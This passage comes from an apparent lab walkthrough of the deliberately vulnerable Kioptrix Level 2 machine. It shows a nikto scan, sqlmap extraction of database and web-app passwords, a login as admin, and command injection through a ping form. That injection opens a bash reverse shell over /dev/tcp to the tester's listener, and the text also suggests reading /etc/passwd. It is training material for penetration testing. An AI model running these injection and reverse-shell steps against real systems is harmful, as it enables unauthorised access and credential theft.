<div class="section" id="nikto">
<h5>3.13.2.2.3.2. nikto<a class="headerlink" href="#nikto" title="Permalink to this headline">¶</a></h5>
<p>Next up was a <strong class="program">nikto</strong> scan:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.101
<span class="nb">cd</span> <span class="nv">$PT</span>/spider
nikto -output nikto.html -host <span class="nv">$T</span> -port <span class="m">80</span>,443
</pre></div>
</div>
<p>The results of the scan were:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/pentest/kioptrix2/spider$</span> <span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.101
</span><span class="gp">hacker@kali:~/pentest/kioptrix2/spider$ cd $</span>PT/spider
<span class="hll"><span class="gp">hacker@kali:~/pentest/kioptrix2/spider$</span> nikto -output nikto.txt -host <span class="nv">$T</span> -port <span class="m">80</span>,443
</span><span class="go">- Nikto v2.1.6</span>
<span class="go">---------------------------------------------------------------------------</span>
<span class="go">+ Target IP:          192.168.1.101</span>
<span class="go">+ Target Hostname:    192.168.1.101</span>
<span class="go">+ Target Port:        80</span>
<span class="go">+ Start Time:         2015-06-30 12:24:37 (GMT-7)</span>
<span class="go">---------------------------------------------------------------------------</span>
<span class="hll"><span class="go">+ Server: Apache/2.0.52 (CentOS)</span>
</span><span class="hll"><span class="go">+ Retrieved x-powered-by header: PHP/4.3.9</span>
</span><span class="go">+ The anti-clickjacking X-Frame-Options header is not present.</span>
<span class="go">+ Apache/2.0.52 appears to be outdated (current is at least Apache/2.4.7). Apache 2.0.65 (final release) and 2.2.26 are also current.</span>
<span class="go">+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE</span>
<span class="go">+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.</span>
<span class="go">+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST</span>
<span class="go">+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span>
<span class="go">+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span>
<span class="go">+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span>
<span class="go">+ Server leaks inodes via ETags, header found with file /manual/, fields: 0x5770d 0x1c42 0xac5f9a00;5770b 0x206 0x84f07cc0</span>
<span class="go">+ Uncommon header &#39;tcn&#39; found, with contents: choice</span>
<span class="go">+ OSVDB-3092: /manual/: Web server manual found.</span>
<span class="go">+ OSVDB-3268: /icons/: Directory indexing found.</span>
<span class="go">+ OSVDB-3268: /manual/images/: Directory indexing found.</span>
<span class="go">+ OSVDB-3233: /icons/README: Apache default file found.</span>
<span class="go">+ 7356 requests: 1 error(s) and 15 item(s) reported on remote host</span>
<span class="go">+ End Time:           2015-06-30 12:25:24 (GMT-7) (47 seconds)</span>
<span class="go">---------------------------------------------------------------------------</span>
<span class="go">+ Target IP:          192.168.1.101</span>
<span class="go">+ Target Hostname:    192.168.1.101</span>
<span class="go">+ Target Port:        443</span>
<span class="go">---------------------------------------------------------------------------</span>
<span class="go">+ SSL Info:        Subject: /C=--/ST=SomeState/L=SomeCity/O=SomeOrganization/OU=SomeOrganizationalUnit/CN=localhost.localdomain/emailAddress=root@localhost.localdomain</span>
<span class="go">                   Ciphers: DHE-RSA-AES256-SHA</span>
<span class="go">                   Issuer:  /C=--/ST=SomeState/L=SomeCity/O=SomeOrganization/OU=SomeOrganizationalUnit/CN=localhost.localdomain/emailAddress=root@localhost.localdomain</span>
<span class="go">+ Start Time:         2015-06-30 12:25:24 (GMT-7)</span>
<span class="go">---------------------------------------------------------------------------</span>
<span class="go">+ Server: Apache/2.0.52 (CentOS)</span>
<span class="go">+ Retrieved x-powered-by header: PHP/4.3.9</span>
<span class="go">+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.</span>
<span class="go">+ All CGI directories &#39;found&#39;, use &#39;-C none&#39; to test none</span>
<span class="go">+ Hostname &#39;192.168.1.101&#39; does not match certificate&#39;s CN &#39;localhost.localdomain/emailAddress=root@localhost.localdomain&#39;</span>
<span class="go">+ Apache/2.0.52 appears to be outdated (current is at least Apache/2.4.7). Apache 2.0.65 (final release) and 2.2.26 are also current.</span>
<span class="go">+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE</span>
<span class="go">+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.</span>
<span class="go">+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST</span>
<span class="go">+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span>
<span class="go">+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span>
<span class="go">+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span>
<span class="go">+ OSVDB-3092: /manual/: Web server manual found.</span>
<span class="go">+ OSVDB-3268: /icons/: Directory indexing found.</span>
<span class="go">+ OSVDB-3268: /manual/images/: Directory indexing found.</span>
<span class="go">+ OSVDB-3233: /icons/README: Apache default file found.</span>
<span class="go">+ 14714 requests: 1 error(s) and 14 item(s) reported on remote host</span>
<span class="go">+ End Time:           2015-06-30 12:29:20 (GMT-7) (236 seconds)</span>
<span class="go">---------------------------------------------------------------------------</span>
<span class="go">+ 2 host(s) tested</span>
</pre></div>
</div>
<p>Additionally we’ve found PHP/4.3.9</p>
</div>
<div class="section" id="visiting-the-web-site">
<h5>3.13.2.2.3.3. Visiting the web site<a class="headerlink" href="#visiting-the-web-site" title="Permalink to this headline">¶</a></h5>
<p>Visiting the website reveals a “Remote System Administration Login” form:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/pentest/kioptrix2/spider$</span> curl --silent --insecure https://<span class="nv">$T</span>/
</span><span class="go">&lt;html&gt;</span>
<span class="go">&lt;body&gt;</span>
<span class="hll"><span class="go">&lt;form method=&quot;post&quot; name=&quot;frmLogin&quot; id=&quot;frmLogin&quot; action=&quot;index.php&quot;&gt;</span>
</span><span class="hll"><span class="go">        &lt;table width=&quot;300&quot; border=&quot;1&quot; align=&quot;center&quot; cellpadding=&quot;2&quot; cellspacing=&quot;2&quot;&gt;</span>
</span><span class="hll"><span class="go">                &lt;tr&gt;</span>
</span><span class="hll"><span class="go">                        &lt;td colspan=&#39;2&#39; align=&#39;center&#39;&gt;</span>
</span><span class="hll"><span class="go">                        &lt;b&gt;Remote System Administration Login&lt;/b&gt;</span>
</span><span class="hll"><span class="go">                        &lt;/td&gt;</span>
</span><span class="hll"><span class="go">                &lt;/tr&gt;</span>
</span><span class="hll"><span class="go">                &lt;tr&gt;</span>
</span><span class="hll"><span class="go">                        &lt;td width=&quot;150&quot;&gt;Username&lt;/td&gt;</span>
</span><span class="hll"><span class="go">                        &lt;td&gt;&lt;input name=&quot;uname&quot; type=&quot;text&quot;&gt;&lt;/td&gt;</span>
</span><span class="hll"><span class="go">                &lt;/tr&gt;</span>
</span><span class="hll"><span class="go">                &lt;tr&gt;</span>
</span><span class="hll"><span class="go">                        &lt;td width=&quot;150&quot;&gt;Password&lt;/td&gt;</span>
</span><span class="hll"><span class="go">                        &lt;td&gt;</span>
</span><span class="hll"><span class="go">                        &lt;input name=&quot;psw&quot; type=&quot;password&quot;&gt;</span>
</span><span class="hll"><span class="go">                        &lt;/td&gt;</span>
</span><span class="hll"><span class="go">                &lt;/tr&gt;</span>
</span><span class="hll"><span class="go">                &lt;tr&gt;</span>
</span><span class="hll"><span class="go">                        &lt;td colspan=&quot;2&quot; align=&quot;center&quot;&gt;</span>
</span><span class="hll"><span class="go">                        &lt;input type=&quot;submit&quot; name=&quot;btnLogin&quot; value=&quot;Login&quot;&gt;</span>
</span><span class="hll"><span class="go">                        &lt;/td&gt;</span>
</span><span class="hll"><span class="go">                &lt;/tr&gt;</span>
</span><span class="hll"><span class="go">        &lt;/table&gt;</span>
</span><span class="hll"><span class="go">&lt;/form&gt;</span>
</span>
<span class="go">&lt;!-- Start of HTML when logged in as Administator --&gt;</span>
<span class="go">&lt;/body&gt;</span>
<span class="go">&lt;/html&gt;</span>
</pre></div>
</div>
</div>
<div class="section" id="sqlmap-the-admin-login-page">
<h5>3.13.2.2.3.4. <strong class="program">sqlmap</strong> the admin login page<a class="headerlink" href="#sqlmap-the-admin-login-page" title="Permalink to this headline">¶</a></h5>
<p>Of course we’ll try an immediate <strong class="program">sqlmap</strong> on the form but the MySQL version being pre-5 creates problems:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.101
<span class="nb">cd</span> <span class="nv">$PT</span>/sqlmap
<span class="nv">URL</span><span class="o">=</span><span class="s2">&quot;https://</span><span class="nv">$T</span><span class="s2">/&quot;</span>
rm -rf <span class="nv">$PWD</span>/sqlmap
sqlmap -u <span class="nv">$URL</span> --random-agent --batch --output-dir <span class="nv">$PWD</span>/sqlmap <span class="se">\</span>
   --banner --current-user --is-dba --current-db --users --passwords <span class="se">\</span>
   --forms --dbs --dbms<span class="o">=</span>MySQL
</pre></div>
</div>
<p>Running this gives us:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/kioptrix2/spider$</span> <span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.101
<span class="gp">hacker@kali:~/pentest/kioptrix2/spider$ cd $</span>PT/sqlmap
<span class="gp">hacker@kali:~/pentest/kioptrix2/sqlmap$ URL=&quot;https://$</span>T/<span class="s2">&quot;</span>
<span class="gp">hacker@kali:~/pentest/kioptrix2/sqlmap$</span><span class="s2"> rm -rf </span><span class="nv">$PWD</span><span class="s2">/sqlmap</span>
<span class="gp">hacker@kali:~/pentest/kioptrix2/sqlmap$</span><span class="s2"> sqlmap -u </span><span class="nv">$URL</span><span class="s2"> --random-agent --batch --output-dir </span><span class="nv">$PWD</span><span class="s2">/sqlmap \</span>
<span class="s2">&gt;    --banner --current-user --is-dba --current-db --users --passwords \</span>
<span class="s2">&gt;    --forms --dbs --dbms=MySQL</span>
<span class="gp">#</span><span class="s2">##################### SNIP ######################</span>
<span class="go">[#1] form:</span>
<span class="go">POST https://192.168.1.101:443/index.php</span>
<span class="go">POST data: uname=&amp;psw=&amp;btnLogin=Login</span>
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="go">POST parameter &#39;uname&#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] N</span>
<span class="go">sqlmap identified the following injection points with a total of 292 HTTP(s) requests:</span>
<span class="go">---</span>
<span class="go">Parameter: uname (POST)</span>
<span class="go">    Type: boolean-based blind</span>
<span class="go">    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)</span>
<span class="go">    Payload: uname=-9335&#39; OR (8916=8916)#&amp;psw=&amp;btnLogin=Login</span>

<span class="go">    Type: AND/OR time-based blind</span>
<span class="go">    Title: MySQL &lt; 5.0.12 AND time-based blind (heavy query)</span>
<span class="go">    Payload: uname=xjtq&#39; AND 7333=BENCHMARK(5000000,MD5(0x68544c4d)) AND &#39;NruE&#39;=&#39;NruE&amp;psw=&amp;btnLogin=Login</span>
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="go">[17:38:59] [INFO] retrieved: 4.1.22</span>
<span class="go">web server operating system: Linux CentOS 4.9</span>
<span class="go">web application technology: PHP 4.3.9, Apache 2.0.52</span>
<span class="go">back-end DBMS: MySQL &lt; 5.0.0</span>
<span class="go">banner:    &#39;4.1.22&#39;</span>
<span class="go">[17:39:00] [INFO] fetching current user</span>
<span class="go">[17:39:00] [INFO] retrieved: john@localhost</span>
<span class="go">current user:    &#39;john@localhost&#39;</span>
<span class="go">[17:39:04] [INFO] fetching current database</span>
<span class="go">[17:39:04] [INFO] retrieved: webapp</span>
<span class="go">current database:    &#39;webapp&#39;</span>
<span class="go">[17:39:06] [INFO] testing if current user is DBA</span>
<span class="go">[17:39:06] [INFO] fetching current user</span>
<span class="go">current user is DBA:    False</span>
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="go">database management system users password hashes:</span>
<span class="go">[*] john [1]:</span>
<span class="go">    password hash: 5a6914ba69e02807</span>
<span class="go">    clear-text password: hiroshima</span>
<span class="go">[*] root [1]:</span>
<span class="go">    password hash: 5a6914ba69e02807</span>
<span class="go">    clear-text password: hiroshima</span>

<span class="go">[17:39:39] [WARNING] information_schema not available, back-end DBMS is MySQL &lt; 5. database names will be fetched from &#39;mysql&#39; database</span>
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="go">available databases [2]:</span>
<span class="go">[*] `test\\_%`</span>
<span class="go">[*] test</span>
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
</pre></div>
</div>
<p>We got some good and contradictory information on databases: the available databases are “test” and “<cite>test\_%</cite>”, ignoring the current-db of “webapp”. And we have these software versions: MySQL 4.1.22, CentOS 4.9, PHP 4.3.9, and Apache 2.0.52.  The database current-user is john who is not a DBA. We also have the passwords for both database users: both john’s and root’s passwords are “hiroshima”.</p>
<p>Now let’s go after the webapp database using the root credentials. However, due to no information_schema we’ll add the options “–common-tables” and “–common-columns”:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.101
<span class="nv">URL</span><span class="o">=</span><span class="s2">&quot;https://</span><span class="nv">$T</span><span class="s2">/&quot;</span>
sqlmap -u <span class="nv">$URL</span> --random-agent --batch --output-dir <span class="nv">$PWD</span>/sqlmap <span class="se">\</span>
   --dbms-cred<span class="o">=</span>root:hiroshima --dbms<span class="o">=</span>MySQL <span class="se">\</span>
   --forms -D webapp --common-tables
</pre></div>
</div>
<p>Running this gets us the “users” table:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/kioptrix2/sqlmap$</span> <span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.101
<span class="gp">hacker@kali:~/pentest/kioptrix2/sqlmap$ URL=&quot;https://$T/&quot;hacker@kali:~/pentest/kioptrix2/sqlmap$</span> sqlmap -u <span class="nv">$URL</span> --random-agent --batch --output-dir <span class="nv">$PWD</span>/sqlmap    --dbms-cred<span class="o">=</span>root:hiroshima --dbms<span class="o">=</span>MySQL    --forms -D webapp --common-tables
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="go">Database: webapp</span>
<span class="go">[1 table]</span>
<span class="go">+-------+</span>
<span class="go">| users |</span>
<span class="go">+-------+</span>
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
</pre></div>
</div>
<p>So let’s see what’s in the “users” table:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.101
<span class="nv">URL</span><span class="o">=</span><span class="s2">&quot;https://</span><span class="nv">$T</span><span class="s2">/&quot;</span>
sqlmap -u <span class="nv">$URL</span> --random-agent --batch --output-dir <span class="nv">$PWD</span>/sqlmap <span class="se">\</span>
   --dbms-cred<span class="o">=</span>root:hiroshima --dbms<span class="o">=</span>MySQL <span class="se">\</span>
   --forms -D webapp -T users --common-columns
</pre></div>
</div>
<p>Here are the results:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/kioptrix2/sqlmap$</span> <span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.101
<span class="gp">hacker@kali:~/pentest/kioptrix2/sqlmap$ URL=&quot;https://$</span>T/<span class="s2">&quot;</span>
<span class="gp">hacker@kali:~/pentest/kioptrix2/sqlmap$</span><span class="s2"> sqlmap -u </span><span class="nv">$URL</span><span class="s2"> --random-agent --batch --output-dir </span><span class="nv">$PWD</span><span class="s2">/sqlmap \</span>
<span class="s2">&gt;     --dbms-cred=root:hiroshima --dbms=MySQL \</span>
<span class="s2">&gt;     --forms -D webapp -T users --common-columns</span>
<span class="gp">#</span><span class="s2">##################### SNIP ######################</span>
<span class="go">Database: webapp</span>
<span class="go">Table: users</span>
<span class="go">[3 columns]</span>
<span class="go">+----------+-------------+</span>
<span class="go">| Column   | Type        |</span>
<span class="go">+----------+-------------+</span>
<span class="go">| id       | numeric     |</span>
<span class="go">| password | non-numeric |</span>
<span class="go">| username | non-numeric |</span>
<span class="go">+----------+-------------+</span>
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
</pre></div>
</div>
<p>Now that we’ve got the columns, let’s dump the table:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span>  <span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.101
  <span class="nv">URL</span><span class="o">=</span><span class="s2">&quot;https://</span><span class="nv">$T</span><span class="s2">/&quot;</span>
  sqlmap -u <span class="nv">$URL</span> --random-agent --batch --output-dir <span class="nv">$PWD</span>/sqlmap <span class="se">\</span>
     --dbms-cred<span class="o">=</span>root:hiroshima --dbms<span class="o">=</span>MySQL <span class="se">\</span>
     --forms -D webapp -T users -C id -C password -C username --dump

Here are the results:

.. code-block:: console
hacker@kali:~/pentest/kioptrix2/sqlmap$ <span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.101
hacker@kali:~/pentest/kioptrix2/sqlmap$ <span class="nv">URL</span><span class="o">=</span><span class="s2">&quot;https://</span><span class="nv">$T</span><span class="s2">/&quot;</span>
hacker@kali:~/pentest/kioptrix2/sqlmap$ sqlmap -u <span class="nv">$URL</span> --random-agent --batch --output-dir <span class="nv">$PWD</span>/sqlmap <span class="se">\</span>
&gt;    --dbms-cred<span class="o">=</span>root:hiroshima --dbms<span class="o">=</span>MySQL <span class="se">\</span>
&gt;    --forms -D webapp -T users -C id -C password -C username --dump
<span class="c1">###################### SNIP ######################</span>
Database: webapp
Table: users
<span class="o">[</span><span class="m">2</span> entries<span class="o">]</span>
+----+----------+------------+
<span class="p">|</span> id <span class="p">|</span> username <span class="p">|</span> password   <span class="p">|</span>
+----+----------+------------+
<span class="p">|</span> <span class="m">1</span>  <span class="p">|</span> admin    <span class="p">|</span> 5afac8d85f <span class="p">|</span>
<span class="p">|</span> <span class="m">2</span>  <span class="p">|</span> john     <span class="p">|</span> 66lajGGbla <span class="p">|</span>
+----+----------+------------+
<span class="c1">###################### SNIP ######################</span>
</pre></div>
</div>
<p>Now we have both the database credentials and the webapp credentials. Let’s see what we can do.</p>
</div>
</div>
</div>
</div>
<div class="section" id="the-exploits">
<h2>3.13.3. The Exploits<a class="headerlink" href="#the-exploits" title="Permalink to this headline">¶</a></h2>
<div class="section" id="exploring-the-web-site">
<h3>3.13.3.1. Exploring the web site<a class="headerlink" href="#exploring-the-web-site" title="Permalink to this headline">¶</a></h3>
<p>Where are we right now? <strong class="program">sqlmap</strong> has given us these accounts:</p>
<table border="1" class="docutils">
<colgroup>
<col width="28%" />
<col width="44%" />
<col width="28%" />
</colgroup>
<thead valign="bottom">
<tr class="row-odd"><th class="head">username</th>
<th class="head">password</th>
<th class="head">application</th>
</tr>
</thead>
<tbody valign="top">
<tr class="row-even"><td>admin</td>
<td>5afac8d85f</td>
<td>webapp</td>
</tr>
<tr class="row-odd"><td>john</td>
<td>66lajGGbla</td>
<td>webapp</td>
</tr>
<tr class="row-even"><td>john</td>
<td>hiroshima</td>
<td>mysql</td>
</tr>
<tr class="row-odd"><td>root</td>
<td>hiroshima</td>
<td>mysql</td>
</tr>
</tbody>
</table>
<p>and these application versions:</p>
<table border="1" class="docutils">
<colgroup>
<col width="60%" />
<col width="40%" />
</colgroup>
<thead valign="bottom">
<tr class="row-odd"><th class="head">application</th>
<th class="head">version</th>
</tr>
</thead>
<tbody valign="top">
<tr class="row-even"><td>CentOS</td>
<td>4.9</td>
</tr>
<tr class="row-odd"><td>Apache</td>
<td>2.0.52</td>
</tr>
<tr class="row-even"><td>MySQL</td>
<td>4.1.22</td>
</tr>
<tr class="row-odd"><td>PHP</td>
<td>4.3.9</td>
</tr>
</tbody>
</table>
<p>So let’s login with admin/5afac8d85f at the sysadmin login page and see where that leads:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="go">T=192.168.1.101</span>
<span class="go">U=admin</span>
<span class="go">P=5afac8d85f</span>
<span class="go">COOKIES=cookies.txt</span>
<span class="gp">#</span> See what the login form looks like
<span class="go">curl --silent --insecure https://$T/ | sed -ne &#39;/&lt;form/,/&lt;\/form&gt;/p&#39;</span>
<span class="gp">#</span> Fill out form and get cookies
<span class="go">curl --silent --insecure https://$T/index.php \</span>
<span class="go">     --data uname=&quot;$U&quot; \</span>
<span class="go">     --data psw=&quot;$P&quot; \</span>
<span class="go">     --data btnLogin=&quot;Login&quot; \</span>
<span class="go">     --cookie-jar &quot;$COOKIES&quot;</span>
<span class="go">ls -l $COOKIES</span>
<span class="gp">#</span> What? No cookies?
<span class="gp">#</span> But we found another form to ping a remote server.
<span class="gp">#</span> Perhaps we can <span class="k">do</span> shell code injection to get a reverse shell.
<span class="gp">#</span> First start up listener in another terminal window:
</pre></div>
</div>
<p>Here’s the results from running the above:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/kioptrix2/exploit$</span> <span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.101
<span class="gp">hacker@kali:~/pentest/kioptrix2/exploit$</span> <span class="nv">U</span><span class="o">=</span>admin
<span class="gp">hacker@kali:~/pentest/kioptrix2/exploit$</span> <span class="nv">P</span><span class="o">=</span>5afac8d85f
<span class="gp">hacker@kali:~/pentest/kioptrix2/exploit$</span> <span class="nv">COOKIES</span><span class="o">=</span>cookies.txt
<span class="gp">hacker@kali:~/pentest/kioptrix2/exploit$ #</span> See what the login form looks like
<span class="hll"><span class="gp">hacker@kali:~/pentest/kioptrix2/exploit$</span> curl --silent --insecure https://<span class="nv">$T</span>/ <span class="p">|</span> sed -ne <span class="s1">&#39;/&lt;form/,/&lt;\/form&gt;/p&#39;</span>
</span><span class="hll"><span class="go">&lt;form method=&quot;post&quot; name=&quot;frmLogin&quot; id=&quot;frmLogin&quot; action=&quot;index.php&quot;&gt;</span>
</span><span class="go">        &lt;table width=&quot;300&quot; border=&quot;1&quot; align=&quot;center&quot; cellpadding=&quot;2&quot; cellspacing=&quot;2&quot;&gt;</span>
<span class="go">                &lt;tr&gt;</span>
<span class="go">                        &lt;td colspan=&#39;2&#39; align=&#39;center&#39;&gt;</span>
<span class="go">                        &lt;b&gt;Remote System Administration Login&lt;/b&gt;</span>
<span class="go">                        &lt;/td&gt;</span>
<span class="go">                &lt;/tr&gt;</span>
<span class="go">                &lt;tr&gt;</span>
<span class="go">                        &lt;td width=&quot;150&quot;&gt;Username&lt;/td&gt;</span>
<span class="hll"><span class="go">                        &lt;td&gt;&lt;input name=&quot;uname&quot; type=&quot;text&quot;&gt;&lt;/td&gt;</span>
</span><span class="go">                &lt;/tr&gt;</span>
<span class="go">                &lt;tr&gt;</span>
<span class="go">                        &lt;td width=&quot;150&quot;&gt;Password&lt;/td&gt;</span>
<span class="go">                        &lt;td&gt;</span>
<span class="hll"><span class="go">                        &lt;input name=&quot;psw&quot; type=&quot;password&quot;&gt;</span>
</span><span class="go">                        &lt;/td&gt;</span>
<span class="go">                &lt;/tr&gt;</span>
<span class="go">                &lt;tr&gt;</span>
<span class="go">                        &lt;td colspan=&quot;2&quot; align=&quot;center&quot;&gt;</span>
<span class="hll"><span class="go">                        &lt;input type=&quot;submit&quot; name=&quot;btnLogin&quot; value=&quot;Login&quot;&gt;</span>
</span><span class="go">                        &lt;/td&gt;</span>
<span class="go">                &lt;/tr&gt;</span>
<span class="go">        &lt;/table&gt;</span>
<span class="go">&lt;/form&gt;</span>
<span class="gp">hacker@kali:~/pentest/kioptrix2/exploit$ #</span> Fill out form and get cookies
<span class="gp">hacker@kali:~/pentest/kioptrix2/exploit$</span> curl --silent --insecure https://<span class="nv">$T</span>/index.php <span class="se">\</span>
&gt;      --data <span class="nv">uname</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$U</span><span class="s2">&quot;</span> <span class="se">\</span>
&gt;      --data <span class="nv">psw</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$P</span><span class="s2">&quot;</span> <span class="se">\</span>
&gt;      --data <span class="nv">btnLogin</span><span class="o">=</span><span class="s2">&quot;Login&quot;</span> <span class="se">\</span>
&gt;      --cookie-jar <span class="s2">&quot;</span><span class="nv">$COOKIES</span><span class="s2">&quot;</span>
<span class="go">&lt;html&gt;</span>
<span class="go">&lt;body&gt;</span>

<span class="go">&lt;!-- Start of HTML when logged in as Administator --&gt;</span>
<span class="hll"><span class="go">        &lt;form name=&quot;ping&quot; action=&quot;pingit.php&quot; method=&quot;post&quot; target=&quot;_blank&quot;&gt;</span>
</span><span class="go">                &lt;table width=&#39;600&#39; border=&#39;1&#39;&gt;</span>
<span class="go">                &lt;tr valign=&#39;middle&#39;&gt;</span>
<span class="go">                        &lt;td colspan=&#39;2&#39; align=&#39;center&#39;&gt;</span>
<span class="go">                        &lt;b&gt;Welcome to the Basic Administrative Web Console&lt;br&gt;&lt;/b&gt;</span>
<span class="go">                        &lt;/td&gt;</span>
<span class="go">                &lt;/tr&gt;</span>
<span class="go">                &lt;tr valign=&#39;middle&#39;&gt;</span>
<span class="go">                        &lt;td align=&#39;center&#39;&gt;</span>
<span class="go">                                Ping a Machine on the Network:</span>
<span class="go">                        &lt;/td&gt;</span>
<span class="go">                                &lt;td align=&#39;center&#39;&gt;</span>
<span class="hll"><span class="go">                                &lt;input type=&quot;text&quot; name=&quot;ip&quot; size=&quot;30&quot;&gt;</span>
</span><span class="hll"><span class="go">                                &lt;input type=&quot;submit&quot; value=&quot;submit&quot; name=&quot;submit&quot;&gt;</span>
</span><span class="go">                        &lt;/td&gt;</span>
<span class="go">                        &lt;/td&gt;</span>
<span class="go">                &lt;/tr&gt;</span>
<span class="go">        &lt;/table&gt;</span>
<span class="go">        &lt;/form&gt;</span>


<span class="go">&lt;/body&gt;</span>
<span class="go">&lt;/html&gt;</span>

<span class="gp">hacker@kali:~/pentest/kioptrix2/exploit$</span> ls -l <span class="nv">$COOKIES</span>
<span class="go">ls: cannot access cookies.txt: No such file or directory</span>
<span class="gp">hacker@kali:~/pentest/kioptrix2/exploit$ #</span> What? No cookies?
<span class="gp">hacker@kali:~/pentest/kioptrix2/exploit$ #</span> But we found another form to ping a remote server.
<span class="gp">hacker@kali:~/pentest/kioptrix2/exploit$ #</span> Perhaps we can <span class="k">do</span> shell code injection to get a reverse shell.
<span class="gp">hacker@kali:~/pentest/kioptrix2/exploit$ #</span> First start up listener in another terminal window:
</pre></div>
</div>
</div>
<div class="section" id="getting-a-reverse-bash-shell">
<h3>3.13.3.2. Getting a reverse bash shell<a class="headerlink" href="#getting-a-reverse-bash-shell" title="Permalink to this headline">¶</a></h3>
<p>So we found another web page allowing us to ping a host. A little experimentation shows it allows us to inject bash code. (Try ‘localhost; cat /etc/passwd’, for example.) So let’s pop up a reverse shell. First step is to create a <strong class="program">socat</strong> listener on Kali in another terminal window:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">#</span> Do this in another terminal window
<span class="go">MYPORT=4444</span>
<span class="go">socat - TCP-LISTEN:$MYPORT</span>
</pre></div>
</div>
<p>Continuing on in the original terminal window, inject a reverse bash shell (see <a class="reference external" href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Reverse Shell Cheat Sheet</a>):</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># Next inject reverse shell after ping command:</span>
<span class="nv">MYIP</span><span class="o">=</span><span class="m">192</span>.168.1.104
<span class="nv">MYPORT</span><span class="o">=</span><span class="m">4444</span>
<span class="nv">COMMAND</span><span class="o">=</span><span class="s1">&#39;localhost;  bash -i &gt;&amp; /dev/tcp/&#39;</span><span class="nv">$MYIP</span>/<span class="nv">$MYPORT</span><span class="s1">&#39; 0&gt;&amp;1&#39;</span>
curl --silent --insecure https://<span class="nv">$T</span>/pingit.php <span class="se">\</span>
     --data-urlencode <span class="nv">ip</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$COMMAND</span><span class="s2">&quot;</span> <span class="se">\</span>
     --data <span class="nv">submit</span><span class="o">=</span><span class="s2">&quot;submit&quot;</span>
</pre></div>
</div>
<p>In the <strong class="program">socat</strong> listener window we get a reverse shell with the apache user:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/kioptrix2/exploit$</span> socat - TCP-LISTEN:<span class="nv">$MYPORT</span>
<span class="go">bash: no job control in this shell</span>
<span class="go">bash-3.00$ id</span>
<span class="go">uid=48(apache) gid=48(apache) groups=48(apache)</span>
<span class="go">bash-3.00$ uname -a</span>
<span class="go">Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 athlon i386 GNU/Linux</span>
<span class="go">bash-3.00$ hostname</span>
<span class="go">kioptrix.level2</span>
<span class="go">bash-3.00$ cat /etc/red*</span>
<span class="go">cat: /etc/redhat-lsb: Is a directory</span>
<span class="go">CentOS release 4.5 (Final)</span>
<span class="go">bash-3.00$</span>
</pre></div>
</div>
</div>
<div class="section" id="getting-to-root-from-apache">
